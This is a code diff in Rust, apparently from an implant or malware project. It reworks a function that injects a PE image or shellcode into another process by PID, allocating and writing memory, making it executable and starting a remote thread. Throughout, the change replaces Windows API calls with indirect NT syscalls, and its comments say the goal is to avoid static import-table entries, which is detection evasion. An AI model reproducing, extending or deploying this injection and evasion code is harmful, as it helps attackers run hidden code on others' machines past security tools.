@@ -1639,51 +1639,51 @@ unsafe fn apply_relocations_remote(
 pub fn inject_into_process(pid: u32, payload: &[u8]) -> Result<()> {
     use std::ptr::null_mut;
     use winapi::shared::basetsd::SIZE_T;
-    use winapi::um::handleapi::CloseHandle;
-    use winapi::um::memoryapi::{VirtualAllocEx, VirtualProtectEx, WriteProcessMemory};
-    use winapi::um::processthreadsapi::{FlushInstructionCache, OpenProcess};
     use winapi::um::winnt::{
         IMAGE_DOS_HEADER, IMAGE_DOS_SIGNATURE, IMAGE_NT_HEADERS64, IMAGE_NT_SIGNATURE, MEM_COMMIT,
         MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_READWRITE, PROCESS_CREATE_THREAD,
         PROCESS_QUERY_INFORMATION, PROCESS_VM_OPERATION, PROCESS_VM_READ, PROCESS_VM_WRITE,
     };
+    use winapi::shared::ntdef::OBJECT_ATTRIBUTES;
 
     unsafe {
-        let hprocess = OpenProcess(
-            PROCESS_VM_OPERATION
-                | PROCESS_VM_WRITE
-                | PROCESS_VM_READ
-                | PROCESS_CREATE_THREAD
-                | PROCESS_QUERY_INFORMATION,
-            0,
-            pid,
+        // P0-13: NtOpenProcess indirect syscall — no static IAT entry.
+        let mut client_id = [0u64; 2];
+        client_id[0] = pid as u64;
+        let mut obj_attr: OBJECT_ATTRIBUTES = std::mem::zeroed();
+        obj_attr.Length = std::mem::size_of::<OBJECT_ATTRIBUTES>() as u32;
+        let access_mask = (PROCESS_VM_OPERATION
+            | PROCESS_VM_WRITE
+            | PROCESS_VM_READ
+            | PROCESS_CREATE_THREAD
+            | PROCESS_QUERY_INFORMATION) as u64;
+        let mut h_proc_usize: usize = 0;
+        let open_status = nt_syscall::syscall!(
+            "NtOpenProcess",
+            &mut h_proc_usize as *mut _ as u64,
+            access_mask,
+            &mut obj_attr as *mut _ as u64,
+            client_id.as_mut_ptr() as u64,
         );
-        if hprocess.is_null() {
+        if let Ok(s) = open_status {
+            if s < 0 || h_proc_usize == 0 {
+                return Err(anyhow!(
+                    "NtOpenProcess(pid={}) failed: status={:#x}",
+                    pid, s
+                ));
+            }
+        } else {
             return Err(anyhow!(
-                "OpenProcess(pid={}) failed: {}",
-                pid,
-                unsafe { get_last_error() }
+                "NtOpenProcess(pid={}) syscall dispatch failed",
+                pid
             ));
         }
+        let hprocess = h_proc_usize as *mut c_void;
 
-        // Resolve NtClose for handle cleanup; fall back to CloseHandle
-        let ntdll_base2 =
-            pe_resolve::get_module_handle_by_hash(pe_resolve::hash_str(b"ntdll.dll\0"))
-                .unwrap_or(0);
-        let nt_close_addr2 = if ntdll_base2 != 0 {
-            pe_resolve::get_proc_address_by_hash(ntdll_base2, pe_resolve::hash_str(b"NtClose\0"))
-        } else {
-            None
-        };
+        // P0-13: NtClose via indirect syscall — no CloseHandle fallback.
         macro_rules! close_h {
             ($h:expr) => {
-                if let Some(addr) = nt_close_addr2 {
-                    type NtCloseFn = unsafe extern "system" fn(*mut c_void) -> i32;
-                    let f: NtCloseFn = std::mem::transmute(addr as *const ());
-                    f($h);
-                } else {
-                    CloseHandle($h);
-                }
+                let _ = nt_syscall::syscall!("NtClose", $h as u64);
             };
         }
 
@@ -1810,14 +1810,16 @@ pub fn inject_into_process(pid: u32, payload: &[u8]) -> Result<()> {
                 [winapi::um::winnt::IMAGE_DIRECTORY_ENTRY_BASERELOC as usize];
             let has_relocs = reloc_dir.VirtualAddress != 0 && reloc_dir.Size != 0;
 
-            let remote_mem = VirtualAllocEx(
-                hprocess,
-                preferred_base as _,
-                image_size,
-                MEM_COMMIT | MEM_RESERVE,
-                PAGE_READWRITE,
+            // P0-13: NtAllocateVirtualMemory with preferred base hint.
+            let mut remote_base_val: usize = preferred_base;
+            let mut alloc_size = image_size;
+            let alloc_status = nt_syscall::syscall!(
+                "NtAllocateVirtualMemory",
+                hprocess as u64, &mut remote_base_val as *mut _ as u64,
+                0u64, &mut alloc_size as *mut _ as u64,
+                (MEM_COMMIT | MEM_RESERVE) as u64, PAGE_READWRITE as u64,
             );
-            let remote_mem = if remote_mem.is_null() {
+            let remote_mem = if alloc_status.map_or(true, |s| s < 0) || remote_base_val == 0 {
                 if !has_relocs {
                     // Cannot load at preferred base and there is no reloc table.
                     close_h!(hprocess);
@@ -1827,31 +1829,42 @@ pub fn inject_into_process(pid: u32, payload: &[u8]) -> Result<()> {
                         pid, preferred_base
                     ));
                 }
-                VirtualAllocEx(
-                    hprocess,
-                    null_mut(),
-                    image_size,
-                    MEM_COMMIT | MEM_RESERVE,
-                    PAGE_READWRITE,
-                )
+                // Retry with null base (system chooses).
+                remote_base_val = 0;
+                alloc_size = image_size;
+                let retry = nt_syscall::syscall!(
+                    "NtAllocateVirtualMemory",
+                    hprocess as u64, &mut remote_base_val as *mut _ as u64,
+                    0u64, &mut alloc_size as *mut _ as u64,
+                    (MEM_COMMIT | MEM_RESERVE) as u64, PAGE_READWRITE as u64,
+                );
+                if retry.map_or(true, |s| s < 0) || remote_base_val == 0 {
+                    null_mut()
+                } else {
+                    remote_base_val as *mut c_void
+                }
             } else {
-                remote_mem
+                remote_base_val as *mut c_void
             };
 
             if remote_mem.is_null() {
                 close_h!(hprocess);
-                return Err(anyhow!("VirtualAllocEx(pid={}) failed", pid));
+                return Err(anyhow!("NtAllocateVirtualMemory(pid={}) failed", pid));
             }
 
             let remote_base = remote_mem as usize;
             let mut written: SIZE_T = 0;
-            WriteProcessMemory(
-                hprocess,
-                remote_mem,
-                payload.as_ptr() as _,
-                (*nt).OptionalHeader.SizeOfHeaders as usize,
-                &mut written,
+            // P0-13: NtWriteVirtualMemory for PE headers.
+            let write_status = nt_syscall::syscall!(
+                "NtWriteVirtualMemory",
+                hprocess as u64, remote_mem as u64,
+                payload.as_ptr() as u64, (*nt).OptionalHeader.SizeOfHeaders as u64,
+                &mut written as *mut _ as u64,
             );
+            if write_status.map_or(true, |s| s < 0) {
+                close_h!(hprocess);
+                return Err(anyhow!("NtWriteVirtualMemory(headers) failed: {:?}", write_status));
+            }
 
             let num_sections = (*nt).FileHeader.NumberOfSections as usize;
             let first_section = (nt as usize + std::mem::size_of::<IMAGE_NT_HEADERS64>())
@@ -1866,12 +1879,12 @@ pub fn inject_into_process(pid: u32, payload: &[u8]) -> Result<()> {
                     continue;
                 }
                 let dst = (remote_base + sec.VirtualAddress as usize) as *mut c_void;
-                WriteProcessMemory(
-                    hprocess,
-                    dst,
-                    payload.as_ptr().add(raw_off) as _,
-                    copy_sz,
-                    &mut written,
+                // P0-13: NtWriteVirtualMemory for section data.
+                let _ = nt_syscall::syscall!(
+                    "NtWriteVirtualMemory",
+                    hprocess as u64, dst as u64,
+                    payload.as_ptr().add(raw_off) as u64, copy_sz as u64,
+                    &mut written as *mut _ as u64,
                 );
             }
 
@@ -1897,12 +1910,14 @@ pub fn inject_into_process(pid: u32, payload: &[u8]) -> Result<()> {
                 );
 
                 if status >= 0 && !pbi.peb_base_address.is_null() {
-                    WriteProcessMemory(
-                        hprocess,
-                        (pbi.peb_base_address as *const u8).add(0x10) as _,
-                        &remote_base as *const _ as _,
-                        std::mem::size_of::<usize>(),
-                        &mut written,
+                    // P0-13: NtWriteVirtualMemory for PEB image-base update.
+                    let _ = nt_syscall::syscall!(
+                        "NtWriteVirtualMemory",
+                        hprocess as u64,
+                        (pbi.peb_base_address as *const u8).add(0x10) as u64,
+                        &remote_base as *const _ as u64,
+                        std::mem::size_of::<usize>() as u64,
+                        &mut written as *mut _ as u64,
                     );
                 } else {
                     tracing::warn!(
@@ -1921,7 +1936,11 @@ pub fn inject_into_process(pid: u32, payload: &[u8]) -> Result<()> {
 
             // Flush the instruction cache for the entire mapped image so the
             // CPU sees the newly-written code (L-04 fix).
-            FlushInstructionCache(hprocess, remote_mem as *mut c_void, image_size);
+            // P0-13: NtFlushInstructionCache indirect syscall.
+            let _ = nt_syscall::syscall!(
+                "NtFlushInstructionCache",
+                hprocess as u64, remote_mem as u64, image_size as u64,
+            );
             let entry = (remote_base + ep_rva) as *mut c_void;
             let mut h_thread: *mut c_void = null_mut();
             let status = nt_create_thread(
@@ -1948,36 +1967,45 @@ pub fn inject_into_process(pid: u32, payload: &[u8]) -> Result<()> {
             close_h!(h_thread);
         } else {
             // Shellcode injection — allocate RW, write, protect RX, then thread
-            let remote_mem = VirtualAllocEx(
-                hprocess,
-                null_mut(),
-                payload.len(),
-                MEM_COMMIT | MEM_RESERVE,
-                PAGE_READWRITE,
+            // P0-13: NtAllocateVirtualMemory indirect syscall.
+            let mut remote_base_val: usize = 0;
+            let mut alloc_size = payload.len();
+            let alloc_status = nt_syscall::syscall!(
+                "NtAllocateVirtualMemory",
+                hprocess as u64, &mut remote_base_val as *mut _ as u64,
+                0u64, &mut alloc_size as *mut _ as u64,
+                (MEM_COMMIT | MEM_RESERVE) as u64, PAGE_READWRITE as u64,
             );
-            if remote_mem.is_null() {
+            if alloc_status.map_or(true, |s| s < 0) || remote_base_val == 0 {
                 close_h!(hprocess);
-                return Err(anyhow!("VirtualAllocEx(shellcode, pid={}) failed", pid));
+                return Err(anyhow!("NtAllocateVirtualMemory(shellcode, pid={}) failed", pid));
             }
+            let remote_mem = remote_base_val as *mut c_void;
             let mut written: SIZE_T = 0;
-            WriteProcessMemory(
-                hprocess,
-                remote_mem,
-                payload.as_ptr() as _,
-                payload.len(),
-                &mut written,
+            // P0-13: NtWriteVirtualMemory for shellcode.
+            let _ = nt_syscall::syscall!(
+                "NtWriteVirtualMemory",
+                hprocess as u64, remote_mem as u64,
+                payload.as_ptr() as u64, payload.len() as u64,
+                &mut written as *mut _ as u64,
             );
+            // P0-13: NtProtectVirtualMemory to RX.
             let mut old_prot = 0u32;
-            VirtualProtectEx(
-                hprocess,
-                remote_mem,
-                payload.len(),
-                PAGE_EXECUTE_READ,
-                &mut old_prot,
+            let mut prot_base = remote_base_val;
+            let mut prot_size = payload.len();
+            let _ = nt_syscall::syscall!(
+                "NtProtectVirtualMemory",
+                hprocess as u64, &mut prot_base as *mut _ as u64,
+                &mut prot_size as *mut _ as u64,
+                PAGE_EXECUTE_READ as u64, &mut old_prot as *mut _ as u64,
             );
             // Flush I-cache before redirecting execution into the newly-written
             // shellcode (L-04 fix).
-            FlushInstructionCache(hprocess, remote_mem, payload.len());
+            // P0-13: NtFlushInstructionCache indirect syscall.
+            let _ = nt_syscall::syscall!(
+                "NtFlushInstructionCache",
+                hprocess as u64, remote_mem as u64, payload.len() as u64,
+            );
             let mut h_sc_thread: *mut c_void = null_mut();
             let sc_status = nt_create_thread(
                 &mut h_sc_thread,
